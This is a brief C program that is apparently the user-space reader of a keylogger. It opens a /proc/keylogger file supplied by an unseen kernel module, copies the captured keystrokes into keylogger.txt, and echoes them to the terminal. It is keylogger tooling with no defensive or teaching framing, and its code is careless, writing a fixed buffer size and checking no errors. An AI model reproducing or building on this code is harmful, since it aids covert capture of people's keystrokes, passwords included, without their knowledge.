#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    char keystrokes[10000];
    printf("Reading the proc file");
    int fd = open("/proc/keylogger", O_RDWR);
    int fud = open("keylogger.txt", O_RDWR);
    read(fd, keystrokes, 10000);
    write(fud, keystrokes, 10000);
    write(STDOUT_FILENO, keystrokes, 10000);
    return 0;
}
